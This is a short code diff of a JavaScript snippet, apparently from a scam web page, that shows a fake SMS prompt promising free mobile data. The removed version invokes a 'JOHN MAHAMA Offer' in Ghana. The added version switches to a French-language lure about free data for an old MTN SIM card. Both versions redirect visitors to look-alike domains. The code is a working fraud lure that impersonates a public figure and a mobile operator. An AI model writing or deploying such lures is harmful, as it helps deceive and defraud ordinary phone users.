@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '50Go de données'
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir 50Go de données gratuites, RÉCOMPENSE POUR LANCIENNE CARTE SIM MTN valable 30 jours, veuillez appuyer sur OK pour ACTIVER ','50Go de données');
+if (password != '50Go de données') {
+location.href='https://mtn.4g-data.info/5Go';
 }
